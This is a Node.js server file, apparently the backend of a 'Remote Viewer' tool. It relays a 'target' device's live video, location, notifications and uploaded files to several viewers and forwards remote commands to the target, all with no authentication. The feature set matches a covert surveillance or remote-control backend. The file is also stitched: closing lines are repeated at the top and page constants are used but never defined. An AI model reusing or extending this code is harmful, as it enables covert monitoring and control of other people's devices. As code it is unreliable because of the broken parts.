// /* ---------------- PAGES ---------------- */
app.use(express.static(path.join(__dirname, 'public')));

server.listen(PORT, () => console.log('Remote Viewer on port ' + PORT));
//  
// ============================================================
const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

const PORT = process.env.PORT || 3000;
const UPLOAD_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

app.use(express.json({ limit: '5mb' }));
app.use('/files', express.static(UPLOAD_DIR));
app.use('/uploads', express.static(UPLOAD_DIR));

let target = null;
const viewers = new Map();
const notifications = [];
const MAX_NOTIFS = 300;

const ICE = [
  { urls: 'stun:stun.l.google.com:19302' },
  { urls: 'stun:stun1.l.google.com:19302' },
  { urls: 'turn:turn.openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
  { urls: 'turn:turn.openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
];

function safeName(name) {
  return String(name || 'file').replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 120);
}

function notify(appName, title, text) {
  const n = { id: crypto.randomBytes(4).toString('hex'), app: appName, title, text, time: Date.now() };
  notifications.unshift(n);
  if (notifications.length > MAX_NOTIFS) notifications.length = MAX_NOTIFS;
  return n;
}

/* ---------------- REST API ---------------- */

app.post('/api/upload', (req, res) => {
  const name = safeName(req.query.filename || ('upload_' + Date.now()));
  const chunks = [];
  req.on('data', (c) => chunks.push(c));
  req.on('end', () => {
    const buf = Buffer.concat(chunks);
    fs.writeFile(path.join(UPLOAD_DIR, name), buf, (err) => {
      if (err) return res.status(500).json({ ok: false, err: String(err) });
      if (req.query.notify !== '0') {
        const n = notify(req.query.app || 'upload', name, (buf.length / 1048576).toFixed(1) + ' MB');
        io.emit('notif', n);
      }
      res.json({ ok: true, url: '/files/' + name });
    });
  });
});

app.get('/api/files', (req, res) => {
  try {
    const items = fs.readdirSync(UPLOAD_DIR).map((name) => {
      const st = fs.statSync(path.join(UPLOAD_DIR, name));
      return { name, size: st.size, time: st.mtimeMs, url: '/files/' + name };
    }).sort((a, b) => b.time - a.time);
    res.json(items);
  } catch (e) { res.json([]); }
});

app.post('/api/delete', (req, res) => {
  const name = safeName((req.body || {}).name);
  try { fs.unlinkSync(path.join(UPLOAD_DIR, name)); } catch (e) {}
  res.json({ ok: true });
});

app.post('/api/notify', (req, res) => {
  const b = req.body || {};
  const n = notify(b.app || 'app', b.title || '', b.text || '');
  io.emit('notif', n);
  res.json({ ok: true });
});

app.get('/api/notifs', (req, res) => res.json(notifications));
app.post('/api/notifs-clear', (req, res) => { notifications.length = 0; res.json({ ok: true }); });
app.post('/api/wipe', (req, res) => res.json({ ok: true }));

app.post('/api/cmd', (req, res) => {
  if (target) target.emit('cmd', req.body);
  res.json({ ok: true });
});

app.get('/api/status', (req, res) => res.json({ target: !!target, viewers: viewers.size }));

/* ---------------- SOCKET SIGNALING (multi-viewer) ---------------- */

io.on('connection', (socket) => {
  socket.on('register-target', () => {
    target = socket;
    io.emit('target-status', true);
    viewers.forEach((v, id) => socket.emit('viewer-joined', id));
  });
  socket.on('register-viewer', () => {
    viewers.set(socket.id, socket);
    socket.emit('target-status', !!target);
    if (target) target.emit('viewer-joined', socket.id);
  });
  socket.on('offer', (o) => {
    if (socket === target && o && o.to) {
      const v = viewers.get(o.to);
      if (v) v.emit('offer', o.offer);
    }
  });
  socket.on('answer', (a) => {
    if (target && a) target.emit('answer', a); // {from, answer}
  });
  socket.on('ice', (c) => {
    if (socket === target && c && c.to) {
      const v = viewers.get(c.to);
      if (v) v.emit('ice', c.data);
    } else if (target) {
      target.emit('ice', c); // {from, data}
    }
  });
  socket.on('location', (p) => viewers.forEach((v) => v.emit('location', p)));
  socket.on('cmd', (c) => target && target.emit('cmd', c));
  socket.on('cmd-result', (r) => viewers.forEach((v) => v.emit('cmd-result', r)));
  socket.on('disconnect', () => {
    const wasViewer = viewers.delete(socket.id);
    if (wasViewer && target) target.emit('viewer-left', socket.id);
    if (socket === target) { target = null; io.emit('target-status', false); }
  });
});

/* ---------------- PAGES ---------------- */

app.get('/', (req, res) => res.send(INDEX_PAGE));
app.get('/target.html', (req, res) => res.send(TARGET_PAGE));
app.get('/view.html', (req, res) => res.send(VIEW_PAGE));
app.get('/gallery.html', (req, res) => res.send(GALLERY_PAGE));

server.listen(PORT, () => console.log('Remote Viewer on port ' + PORT));
